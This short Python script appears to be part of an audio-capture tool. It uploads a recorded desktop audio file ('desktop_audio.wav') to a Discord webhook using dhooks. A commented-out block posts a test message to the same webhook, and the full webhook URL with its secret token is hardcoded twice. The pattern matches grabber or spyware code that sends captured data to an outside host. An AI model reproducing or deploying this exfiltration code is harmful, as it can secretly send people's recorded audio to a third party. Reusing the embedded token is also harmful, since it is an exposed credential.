'''
import requests
import Bro
webhook_url = 'https://discord.com/api/webhooks/1461244445058924619/tC4fUIBShpIMPWBEPOdUc6Z6D9ioNAC7mgUBfhLy_dWo70Nn8QlB36g3dv9WdZbprKX_'

data = {
    "content": "audio should be working "
}


response = requests.post(webhook_url, json=data)

'''


from dhooks import Webhook, File
from Bro import OUTPUT_FILENAME

hook = Webhook("https://discord.com/api/webhooks/1461244445058924619/tC4fUIBShpIMPWBEPOdUc6Z6D9ioNAC7mgUBfhLy_dWo70Nn8QlB36g3dv9WdZbprKX_")


discord = File("files/Pyaduio/desktop_audio.wav")
               
hook.send(file=discord)

